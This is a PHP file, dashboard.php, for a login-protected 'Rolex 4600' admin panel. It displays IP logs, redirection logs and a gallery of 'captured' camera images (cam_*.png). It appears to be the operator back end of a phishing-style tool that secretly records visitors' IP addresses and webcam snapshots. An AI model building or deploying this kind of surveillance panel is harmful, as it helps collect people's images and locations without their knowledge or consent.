<?php
// dashboard.php
require_once 'auth.php';
require_once 'log.php';

if (isset($_GET['logout'])) {
    logout();
}

if (!isLoggedIn()) {
    // Process login if form submitted
    if (isset($_POST['login'])) {
        $user = trim($_POST['user']);
        $pass = trim($_POST['pass']);
        if (login($user, $pass)) {
            header("Location: dashboard.php");
            exit();
        } else {
            $error = "Invalid credentials.";
        }
    }
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <title>Login - Rolex 4600 Admin Panel</title>
      <style>
        form { width: 300px; margin: 100px auto; }
        label, input, button { display: block; width: 100%; margin-bottom: 10px; }
        .error { color: red; }
      </style>
    </head>
    <body>
      <form method="post">
          <?php if(isset($error)) echo "<p class='error'>$error</p>"; ?>
          <label>Username:</label>
          <input type="text" name="user" required>
          <label>Password:</label>
          <input type="password" name="pass" required>
          <button type="submit" name="login">Login</button>
      </form>
    </body>
    </html>
    <?php
    exit();
}

// Display logs and images if logged in
$ip_log = file_exists("ip.txt") ? file_get_contents("ip.txt") : "No IP logs found.";
$redirect_log = file_exists("redirects.log") ? file_get_contents("redirects.log") : "No redirection logs found.";
$images = glob("cam_*.png");
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Rolex 4600 - Admin Dashboard</title>
  <style>
    body { font-family: Arial, sans-serif; }
    .container { width: 80%; margin: auto; }
    .logout { position: absolute; top: 10px; right: 10px; }
    pre { background: #f4f4f4; padding: 10px; }
    img { width: 200px; margin: 5px; }
  </style>
</head>
<body>
  <div class="container">
    <h1>Rolex 4600 - Admin Dashboard</h1>
    <a class="logout" href="?logout=true">Logout</a>
    <h2>IP Logs</h2>
    <pre><?php echo htmlspecialchars($ip_log); ?></pre>
    <h2>Redirection Logs</h2>
    <pre><?php echo htmlspecialchars($redirect_log); ?></pre>
    <h2>Captured Images</h2>
    <div>
      <?php 
        if (!empty($images)) {
            foreach ($images as $img) {
                echo "<img src='" . htmlspecialchars($img) . "' alt='Captured Image'>";
            }
        } else {
            echo "<p>No images captured.</p>";
        }
      ?>
    </div>
  </div>
</body>
</html>
